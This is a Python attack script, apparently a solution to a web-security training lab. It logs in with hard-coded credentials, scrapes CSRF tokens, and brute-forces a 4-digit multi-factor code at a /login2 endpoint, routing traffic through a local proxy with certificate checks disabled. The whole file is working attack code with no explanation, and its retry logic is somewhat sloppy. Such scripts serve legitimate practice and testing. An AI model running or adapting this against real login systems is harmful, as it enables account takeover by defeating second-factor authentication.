import requests
import sys
import urllib3
import urllib
from bs4 import BeautifulSoup
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'https://127.0.0.1:8080'}


def getCookieSession(res):
	return re.findall(r'(\w+)=(\w+)', res.headers['Set-Cookie'])[0][1]

def login(url, start, end, mfa):
	
	r = requests.get(url+"/login", verify=False, proxies=proxies)
	session = getCookieSession(r)
	headers = {"Cookie": "session=%s" % session}
	soup = BeautifulSoup(r.text, 'html.parser')
	csrf = soup.body.find_all('input',{"name":"csrf"})[0].get("value")
	
	
	# csrf=Gxt2SygBUVxX3NM1XU9uSVDHCcw0fPyo&username=carlos&password=montoya
	data = {"csrf": csrf, "username":"carlos", "password":"montoya"}
	# print(data)
	r = requests.post(url+"/login", verify=False, proxies=proxies, data=data, headers=headers, allow_redirects=False)
	
	# res = r.text
	if r.status_code == 302:
		session = getCookieSession(r)
		headers = {"Cookie": "session=%s" % session}
		r = requests.get(url+"/login2", verify=False, proxies=proxies, headers=headers)
		soup = BeautifulSoup(r.text, 'html.parser')
		csrf = soup.body.find_all('input',{"name":"csrf"})[0].get("value")
		# print(csrf)	
		login_two(url, start, end, session, csrf, mfa)

def login_two(url,start, end, session, csrf, mfa): 
	for i in range(2):
		
		headers = {"Cookie": "session=%s" % session}
		data = {"csrf":csrf, "mfa-code": '{0:04}'.format(mfa)}
		print(data)
		r = requests.post(url+"/login2", verify=False, proxies=proxies, data=data, headers=headers)
		res = r.text
		mfa+=1
		
		

		# if 'Username' in res || 'Password' in res:
			
		if 'Please enter your 4-digit security code' not in res:
			login(url, start, end, mfa)



def main():
	if len(sys.argv) != 2:
		print("(-) usage %s <url>" % sys.argv[0])
		print("(-) Example: %s www.example.com" % sys.argv[1])

	url = sys.argv[1]
	# print(sys.argv[2])
	print("(+) Brute force MFA code")
	# password_length = sql_password_length(url)
	# login(url, int(sys.argv[2]), int(sys.argv[2]) + 1000)
	login(url, 0, 5, 0)
	# cookie = re.findall(r'(\w+)=(\w+)', "session=1U5xdVFnV13EqI0B7PKu4qwt2sn8trs8; Secure; HttpOnly; SameSite=None")
	# print(cookie[0][1])
	
	
if __name__ == "__main__":
	main()